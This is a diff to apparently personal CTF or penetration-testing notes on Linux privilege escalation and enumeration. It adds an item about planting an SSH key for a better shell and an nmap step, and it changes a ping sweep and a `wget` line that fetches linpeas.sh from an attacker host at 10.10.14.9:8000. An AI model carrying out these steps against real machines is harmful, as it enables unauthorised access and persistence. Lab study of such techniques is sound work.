@@ -56,6 +56,7 @@ File system - interesting files?
 	is `/etc/passwd` writeable
 	find anything named backup?
 	write permissions in the directories in the path - might be able to replace executable
+    `.ssh` in any user dir, if nothing else make one for ourselves to get a prettier shell :)
 
 Check config files
 	`cat /etc/exports` nfs config file
@@ -120,7 +121,7 @@ Open ports
 	`lsof -i -P`
 
 scan for other machines
-	`for ip in {1..254} ;do (ping -c 1 192.168.0.$ip | grep "bytes from") done`
+	`for ip in {1..254} ;do (ping -c 1 10.10.10.$ip | grep "bytes from") done`
 
 finding files, like flags:
 	`find / -type f -name flag2.txt 2> /dev/null`
@@ -161,8 +162,12 @@ if we found a git repo or web dir on the machine
 ---
 
 network
+	`ip a`
 	`ifconfig` what interfaces exist..
 	`ip route` check this with route table
+	`nmap` ...
+
+check for other disks
 
 
 ---
@@ -170,7 +175,7 @@ network
 Use tools
 	[[enum4linux|enum4linux]]
 	[[linpeas]] [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-	`wget 10.18.21.236:8000/enum/linpeas.sh`
+	`wget 10.10.14.9:8000/enum/linpeas.sh`
 	[LinEnum](https://github.com/rebootuser/LinEnum)
 	[LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
 	[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
